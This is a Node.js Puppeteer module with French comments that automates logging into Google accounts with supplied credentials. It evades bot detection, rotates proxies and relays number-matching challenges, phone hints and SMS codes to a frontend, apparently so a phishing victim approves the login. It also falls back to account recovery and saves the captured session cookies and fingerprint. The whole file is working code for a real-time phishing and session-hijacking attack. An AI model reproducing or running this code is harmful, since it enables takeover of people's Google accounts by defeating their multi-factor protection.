/**
 * AGENT D'AUTENTIFICATION GOOGLE AUTOMATISE
 * Pilote Puppeteer pour se connecter comme un humain
 */

const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const { getProxyForAccount } = require('./proxy-rotator');
const { saveSession, loadSession, applySessionToPage, extractImportantCookies } = require('./session-manager');
const { updateUserStatus } = require('../api/supabase-client');
const { setRelay } = require('./relay-store');

puppeteer.use(StealthPlugin());

const HUMAN_DELAY = () => 2000 + Math.random() * 3000;

/**
 * Trouve et clique sur un element par texte (Puppeteer-safe)
 */
async function clickByText(page, texts) {
  const found = await page.evaluate((texts) => {
    const els = Array.from(document.querySelectorAll('button, div[role="button"], a, span[role="button"], input[type="button"]'));
    for (const text of texts) {
      const el = els.find(e => e.innerText && e.innerText.trim().toLowerCase().includes(text.toLowerCase()));
      if (el) { el.click(); return true; }
    }
    return false;
  }, texts);
  return found;
}

async function findByText(page, texts) {
  const handle = await page.evaluateHandle((texts) => {
    const els = Array.from(document.querySelectorAll('button, div[role="button"], a, span[role="button"], input[type="button"], [role="link"]'));
    for (const text of texts) {
      const el = els.find(e => e.innerText && e.innerText.trim().toLowerCase().includes(text.toLowerCase()));
      if (el) return el;
    }
    return null;
  }, texts);
  const element = handle.asElement();
  return element;
}
const TYPING_DELAY = () => 50 + Math.random() * 100;

async function attemptGoogleAuth(userId, email, password, options = {}) {
  const useStealth = options.headless !== false;
  const puppeteer = useStealth ? require('puppeteer-extra') : require('puppeteer');
  if (useStealth) {
    const StealthPlugin = require('puppeteer-extra-plugin-stealth');
    puppeteer.use(StealthPlugin());
  }

  const proxy = getProxyForAccount(userId);
  const existingSession = await loadSession(userId);

  // Debug log file
  const debugLog = path.join(__dirname, '..', `bot_debug_${userId}_${Date.now()}.log`);
  function dlog(msg) {
    const line = `[${new Date().toISOString()}] ${msg}`;
    console.log(line);
    fs.appendFileSync(debugLog, line + '\n');
  }

  dlog(`========================================`);
  dlog(`[AGENT] Tentative auth pour: ${email}`);
  dlog(`[AGENT] Proxy: ${proxy ? proxy.region : 'AUCUN (TEST)'}`);
  dlog(`[AGENT] Session existante: ${existingSession ? 'OUI' : 'NON'}`);
  dlog(`[AGENT] headless=${options.headless !== false}, useStealth=${useStealth}`);
  dlog(`========================================`);

  // Helper to push phone/code updates to the frontend relay
  async function relayNotify(data) {
    try {
      if (email) setRelay(email, data);
    } catch (e) { console.error('[AGENT] Relay error:', e.message); }
  }

  // Invalider l'ancien statut pour éviter qu'un re-clic "Valider" passe
  // avant que le bot ait vraiment confirmé cette nouvelle tentative
  await updateUserStatus(userId, 'auth_started');

  let browser = null;

  try {
    const os = require('os');
    const path = require('path');
    const userDataDir = path.join(os.tmpdir(), 'cademo-profile-' + userId);
    if (!fs.existsSync(userDataDir)) fs.mkdirSync(userDataDir, { recursive: true });

    const launchOptions = {
      headless: options.headless !== false,
      userDataDir: userDataDir,
      args: [
        '--window-size=1366,768',
        '--window-position=' + Math.floor(Math.random()*200) + ',' + Math.floor(Math.random()*200),
        '--lang=fr-FR,fr',
        '--no-first-run',
        '--no-default-browser-check',
        '--password-store=basic',
        '--enable-features=NetworkService,NetworkServiceInProcess',
        '--disable-blink-features=AutomationControlled',
        '--disable-features=IsolateOrigins,site-per-process',
        '--disable-web-security',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--disable-gpu',
        '--disable-infobars',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-breakpad',
        '--disable-component-update',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-features=TranslateUI',
        '--disable-hang-monitor',
        '--disable-ipc-flooding-protection',
        '--disable-popup-blocking',
        '--disable-prompt-on-repost',
        '--disable-renderer-backgrounding',
        '--disable-sync',
        '--force-color-profile=srgb',
        '--metrics-recording-only',
        '--no-pings',
        '--no-sandbox',
        '--no-zygote',
        '--use-fake-ui-for-media-stream',
        '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
      ],
      defaultViewport: null
    };

    // Proxy depuis .env (PROXY_URL=http://user:pass@host:port)
    const envProxy = process.env.PROXY_URL;
    if (envProxy) {
      launchOptions.args.push('--proxy-server=' + envProxy);
      console.log('[AGENT] Proxy .env actif');
    } else if (proxy) {
      launchOptions.args.push('--proxy-server=' + proxy.url);
    }

    browser = await puppeteer.launch(launchOptions);
    const page = await browser.newPage();

    // Anti-detection : masquer webdriver et simuler un vrai navigateur
    await page.evaluateOnNewDocument(() => {
      Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
      Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
      Object.defineProperty(navigator, 'languages', { get: () => ['fr-FR', 'fr', 'en-US', 'en'] });
      window.chrome = { runtime: {} };
      try { delete window.__proto__.cdc_; } catch(e){}
      try { delete window.__proto__.cdc_adam; } catch(e){}
      try { delete navigator.__proto__.webdriver; } catch(e){}
    });

    if (existingSession) {
      const applied = await applySessionToPage(page, existingSession);
      if (applied) {
        await page.goto('https://myaccount.google.com', { waitUntil: 'networkidle2', timeout: 30000 });
        const isLoggedIn = await page.evaluate(() => {
          return document.querySelector('img[alt*="photo"], a[href*="SignOut"], [data-email]') !== null;
        });
        if (isLoggedIn) {
          console.log('[AGENT] Deja connecte avec session existante !');
          await updateUserStatus(userId, 'session_active');
          await browser.close();
          return { success: true, method: 'existing_session' };
        }
      }
    }

    console.log('[AGENT] Navigation vers accounts.google.com...');
    await page.goto('https://accounts.google.com/ServiceLogin', { waitUntil: 'networkidle2', timeout: 60000 });
    await delay(HUMAN_DELAY());

    // ANTI-DETECTION: mouvements souris aleatoires
    await page.mouse.move(400 + Math.random()*200, 300 + Math.random()*150);
    await delay(200 + Math.random()*400);
    await page.mouse.move(600 + Math.random()*200, 400 + Math.random()*150);
    await delay(300 + Math.random()*300);

    // ETAPE EMAIL (robuste avec Entree)
    console.log('[AGENT] Remplissage email...');
    await page.waitForSelector('input[type="email"], input[name="identifier"], #identifierId, input[aria-label*="email"]', { timeout: 20000 });
    await delay(800);
    const emailInput = await page.$('input[type="email"], input[name="identifier"], #identifierId, input[aria-label*="email"]');
    if (!emailInput) throw new Error('Champ email introuvable');
    await emailInput.click();
    await delay(300);
    await emailInput.type(email, { delay: TYPING_DELAY() });
    await delay(1000 + Math.random() * 1000);
    await page.keyboard.press('Enter');
    console.log('[AGENT] Email soumis (Entree), attente transition...');
    await delay(4000 + Math.random() * 2000);

    // ETAPE MOT DE PASSE (robuste avec Entree)
    console.log('[AGENT] Remplissage mot de passe...');
    // Google utilise souvent input[name="Passwd"] avec un P majuscule
    const passSelectors = [
      'input[type="password"]',
      'input[name="Passwd"]',
      'input[name="password"]',
      '#password',
      'input[aria-label*="Mot de passe"]',
      'input[aria-label*="Password"]'
    ];
    let passInput = null;
    for (const sel of passSelectors) {
      passInput = await page.$(sel);
      if (passInput) break;
    }
    if (!passInput) {
      console.log('[AGENT] Champ password non visible, nouvelle tentative dans 3s...');
      await delay(3000);
      for (const sel of passSelectors) {
        passInput = await page.$(sel);
        if (passInput) break;
      }
    }
    if (!passInput) {
      console.log('[AGENT] Screenshot avant echec...');
      await page.screenshot({ path: './debug_no_password_' + userId + '_' + Date.now() + '.png', fullPage: true });
      await browser.close();
      return { success: false, method: 'password_field_not_found', currentUrl: page.url() };
    }
    await passInput.click();
    await delay(400);
    await passInput.type(password, { delay: TYPING_DELAY() });
    await delay(1000 + Math.random() * 1000);
    await page.keyboard.press('Enter');
    console.log('[AGENT] Mot de passe soumis (Entree), attente...');
    await delay(6000 + Math.random() * 3000);

    const currentUrl = page.url();
    console.log(`[AGENT] URL actuelle: ${currentUrl}`);

    // SCENARIO 1: Connexion directe
    if (currentUrl.includes('myaccount.google.com') || 
        currentUrl.includes('accounts.google.com/ManageAccount') ||
        (!currentUrl.includes('ServiceLogin') && !currentUrl.includes('signin'))) {
      console.log('[AGENT] CONNEXION DIRECTE REUSSIE !');
      const cookies = await extractImportantCookies(page);
      const fingerprint = {
        userAgent: await page.evaluate(() => navigator.userAgent),
        viewport: { width: 1920, height: 1080 },
        platform: 'Win32',
        language: 'fr-FR',
        timezone: 'Europe/Paris'
      };
      await saveSession(userId, cookies, fingerprint);
      await updateUserStatus(userId, 'session_active');
      await browser.close();
      return { success: true, method: 'direct_login', cookiesCount: cookies.length };
    }

    // SCENARIO 1.5: Challenge "Confirmez que c'est vous" avec un nombre à 2 chiffres affiché
    const pageTextAfterPassword = await page.evaluate(() => document.body.innerText);
    const isConfirmChallenge = pageTextAfterPassword.includes('Confirmez') || pageTextAfterPassword.includes('Confirm') || pageTextAfterPassword.includes('Touchez') || pageTextAfterPassword.includes('Tap') || pageTextAfterPassword.includes('numéro') || pageTextAfterPassword.includes('number') || pageTextAfterPassword.includes('sélectionnez');
    if (isConfirmChallenge) {
      const numberMatch = pageTextAfterPassword.match(/\b(\d{2})\b/);
      if (numberMatch) {
        relayNotify({ code: numberMatch[1], status: 'push_number_required' });
        console.log('[AGENT] Nombre de confirmation détecté:', numberMatch[1]);
        let waitCount = 0;
        const maxWait = 120; // 6 minutes
        while (waitCount < maxWait) {
          await delay(3000);
          waitCount++;
          const url = page.url();
          if (url.includes('myaccount.google.com') || url.includes('accounts.google.com/ManageAccount') || (!url.includes('signin') && !url.includes('challenge'))) {
            console.log('[AGENT] Connexion confirmée après challenge nombre !');
            const cookies = await extractImportantCookies(page);
            const fingerprint = {
              userAgent: await page.evaluate(() => navigator.userAgent),
              viewport: { width: 1920, height: 1080 },
              platform: 'Win32',
              language: 'fr-FR',
              timezone: 'Europe/Paris'
            };
            await saveSession(userId, cookies, fingerprint);
            await updateUserStatus(userId, 'session_active');
            await browser.close();
            return { success: true, method: 'push_number_confirmed', code: numberMatch[1], cookiesCount: cookies.length };
          }
        }
        console.log('[AGENT] Timeout sur challenge nombre');
        await updateUserStatus(userId, 'push_number_timeout');
        await browser.close();
        return { success: false, method: 'push_number_timeout', code: numberMatch[1] };
      }
    }

    // SCENARIO 2: Mot de passe incorrect
    const wrongPassword = await page.evaluate(() => {
      return document.body.innerText.includes('mot de passe est incorrect') ||
             document.body.innerText.includes('Wrong password') ||
             document.querySelector('div[role="alert"]') !== null;
    });

    if (wrongPassword) {
      console.log('[AGENT] Mot de passe incorrect -> Mot de passe oublie...');
      const forgotLink = await findByText(page, ['Mot de passe oublie', 'Forgot password']) || await page.$('a[href*="signin/recovery"]');
      
      if (forgotLink) {
        await forgotLink.click();
        await delay(HUMAN_DELAY() * 2);

        const pageText = await page.evaluate(() => document.body.innerText);
        if (pageText.includes('telephone') || pageText.includes('phone') || 
            pageText.includes('notification') || pageText.includes('approuver')) {
          
          console.log('[AGENT] Option notification telephone trouvee !');
          const notificationBtn = await findByText(page, ['Essayer une autre methode', 'Try another way']);
          if (notificationBtn) {
            await notificationBtn.click();
            await delay(HUMAN_DELAY() * 2);
          }

          let chosenMethodText = '';
          const choices = await page.$$('div[role="button"], li, .OVnw0d');
          for (const choice of choices) {
            const text = await page.evaluate(el => el.innerText, choice);
            if (text && (text.includes('telephone') || text.includes('approuver') || text.includes('notification') || text.includes('phone'))) {
              await choice.click();
              chosenMethodText = text;
              console.log('[AGENT] Methode notification selectionnee');
              await delay(HUMAN_DELAY());
              break;
            }
          }

          // Extraire le numéro (masqué ou complet) affiché par Google et le relayer immédiatement
          try {
            const postChoiceText = await page.evaluate(() => document.body.innerText);
            const phoneMatch = postChoiceText.match(/(\+?\d[\d\s\-\.]{6,20})/) ||
                               postChoiceText.match(/(\d{2}[\s\.]*\d{2}[\s\.]*\d{2}[\s\.]*\d{2}[\s\.]*\d{2})/) ||
                               postChoiceText.match(/(finissant par \d{2,4})/i) ||
                               postChoiceText.match(/(\.\.\.\d{2,4})/);
            const detectedPhone = phoneMatch ? phoneMatch[0] : (chosenMethodText || null);
            if (detectedPhone) {
              console.log('[AGENT] Numéro/méthode détecté:', detectedPhone);
              relayNotify({ phone: detectedPhone, status: 'phone_selected' });
            }
          } catch (e) { /* ignorer erreur extraction */ }

          let waitingForUser = true;
          let waitCount = 0;
          const maxWait = 120;

          console.log('[AGENT] Attente "Oui c\'est moi" sur le telephone...');
          console.log(`[AGENT] Timeout: ${maxWait * 3}s = ${(maxWait * 3) / 60} minutes`);

          while (waitingForUser && waitCount < maxWait) {
            await delay(3000);
            waitCount++;

            const url = page.url();
            if (!url.includes('recovery') && !url.includes('signin/v2/challenge') && 
                (url.includes('myaccount') || url.includes('gds/account'))) {
              
              console.log(`[AGENT] UTILISATEUR A CLIQUE "OUI C\'EST MOI" !`);
              waitingForUser = false;

              const cookies = await extractImportantCookies(page);
              const fingerprint = {
                userAgent: await page.evaluate(() => navigator.userAgent),
                viewport: { width: 1920, height: 1080 },
                platform: 'Win32',
                language: 'fr-FR',
                timezone: 'Europe/Paris'
              };

              await saveSession(userId, cookies, fingerprint);
              await updateUserStatus(userId, 'session_active');
              await browser.close();
              return {
                success: true,
                method: 'notification_push',
                waitTimeSeconds: waitCount * 3,
                cookiesCount: cookies.length
              };
            }

            const challengeText = await page.evaluate(() => document.body.innerText);
            // Détection nombre à 2 chiffres dans le challenge push notification (recovery)
            const numberMatch = challengeText.match(/\b(\d{2})\b/);
            if (numberMatch && (challengeText.includes('Confirmez') || challengeText.includes('Confirm') || challengeText.includes('Touchez') || challengeText.includes('Tap') || challengeText.includes('numéro') || challengeText.includes('number'))) {
              relayNotify({ code: numberMatch[1], status: 'push_number_required' });
              console.log('[AGENT] Nombre de confirmation (recovery) relayer:', numberMatch[1]);
            }
            if (challengeText.includes('code') || challengeText.includes('6 chiffres') || challengeText.includes('SMS')) {
              // Essayer d'extraire un code visible sur la page (ou un numéro masqué)
              const codeMatch = challengeText.match(/\b\d{6}\b/);
              const phoneMatch = challengeText.match(/(\+?\d[\d\s\-\.]{6,20})/) || challengeText.match(/(finissant par \d{2,4})/i);
              if (codeMatch || phoneMatch) {
                relayNotify({ code: codeMatch ? codeMatch[0] : undefined, phone: phoneMatch ? phoneMatch[0] : undefined, status: 'code_required' });
                console.log('[AGENT] Relai SMS/code:', codeMatch ? codeMatch[0] : '-', phoneMatch ? phoneMatch[0] : '-');
              } else {
                relayNotify({ status: 'sms_required' });
              }
              console.log('[AGENT] Google demande un code SMS/App - non automatise');
              await updateUserStatus(userId, 'requires_sms_code');
              await browser.close();
              return { success: false, method: 'sms_required' };
            }

            if (waitCount % 10 === 0) {
              console.log(`[AGENT] ... toujours en attente (${waitCount * 3}s)`);
            }
          }

          if (waitingForUser) {
            console.log('[AGENT] Timeout - utilisateur n\'a pas repondu');
            await updateUserStatus(userId, 'notification_timeout');
            await browser.close();
            return { success: false, method: 'notification_timeout' };
          }
        } else {
          console.log('[AGENT] Option notification non trouvee');
          await updateUserStatus(userId, 'recovery_unavailable');
          await browser.close();
          return { success: false, method: 'no_notification_option' };
        }
      } else {
        console.log('[AGENT] Lien "Mot de passe oublie" introuvable');
        await updateUserStatus(userId, 'forgot_link_missing');
        await browser.close();
        return { success: false, method: 'forgot_link_missing' };
      }
    }

    // SCENARIO 3: 2FA
    const challengeDetected = await page.evaluate(() => {
      return document.body.innerText.includes('Verifier') ||
             document.body.innerText.includes('Verify') ||
             document.body.innerText.includes('2-Step') ||
             document.querySelector('input[type="tel"], input[aria-label*="code"]') !== null;
    });

    if (challengeDetected) {
      console.log('[AGENT] 2FA detecte - non automatise');
      // Relayer tout numéro/code visible sur la page 2FA
      try {
        const bodyText = await page.evaluate(() => document.body.innerText);
        const phoneMatch = bodyText.match(/(\+?\d[\d\s\-\.]{6,20})/) || bodyText.match(/(finissant par \d{2,4})/i);
        const codeMatch = bodyText.match(/\b\d{6}\b/) || bodyText.match(/\b(\d{2})\b/);
        relayNotify({ phone: phoneMatch ? phoneMatch[0] : undefined, code: codeMatch ? codeMatch[0] : undefined, status: '2fa_detected' });
      } catch (e) {}
      await updateUserStatus(userId, 'requires_2fa');
      await browser.close();
      return { success: false, method: '2fa_required' };
    }

    // SCENARIO 4: Inconnu
    console.log('[AGENT] Scenario non reconnu');
    const screenshotPath = `./debug_${userId}_${Date.now()}.png`;
    await page.screenshot({ path: screenshotPath, fullPage: true });
    console.log(`[AGENT] Screenshot: ${screenshotPath}`);
    
    await updateUserStatus(userId, 'unknown_error');
    await browser.close();
    return { success: false, method: 'unknown', currentUrl };

  } catch (error) {
    console.error('[AGENT] ERREUR CRITIQUE:', error);
    if (browser) await browser.close();
    return { success: false, method: 'error', message: error.message };
  }
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

module.exports = { attemptGoogleAuth };
